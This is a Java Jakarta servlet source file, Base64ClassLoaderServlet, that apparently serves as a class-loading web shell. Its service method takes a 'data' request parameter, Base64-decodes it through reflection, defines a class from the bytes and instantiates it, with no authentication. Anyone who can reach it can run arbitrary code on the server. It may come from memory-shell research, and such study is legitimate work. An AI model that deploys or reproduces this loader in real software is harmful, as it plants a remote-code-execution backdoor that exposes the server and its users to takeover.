package jakarta;

import jakarta.servlet.*;

import java.io.IOException;

/**
 * @author ReaJason
 * @since 2024/12/24
 */
public class Base64ClassLoaderServlet extends ClassLoader implements Servlet {

    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        String data = req.getParameter("data");
        try {
            byte[] bytes = decodeBase64(data);
            Object obj = defineClass(null, bytes, 0, bytes.length).newInstance();
            res.getWriter().print(obj);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    static byte[] decodeBase64(String base64Str) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception var4) {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    @Override
    public String getServletInfo() {
        return "";
    }

    @Override
    public void destroy() {

    }
}
